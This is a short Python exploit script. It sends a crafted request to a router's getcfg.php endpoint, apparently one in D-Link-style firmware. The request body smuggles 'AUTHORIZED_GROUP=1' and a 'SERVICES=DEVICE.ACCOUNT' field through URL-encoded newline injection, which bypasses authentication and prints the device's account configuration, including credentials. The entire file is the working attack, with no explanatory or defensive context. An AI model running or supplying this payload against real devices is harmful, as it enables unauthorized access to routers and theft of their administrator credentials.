import requests as rq

EQ = "%3d"
IP = "192.168.0.1"
PORT = "80"

def pair(key, value):
    return "%0a_POST_" + key + EQ + value

headers_multipart = {
    'CONTENT-TYPE' : 'application/x-www-form-urlencoded'
}

url = 'http://{ip}:{port}/getcfg.php'.format(ip=IP, port=PORT)
auth = "%0aAUTHORIZED_GROUP%3d1"
data = "A=A" + pair("SERVICES", "DEVICE.ACCOUNT") + auth

print(rq.get(url, data=data, headers=headers_multipart).text)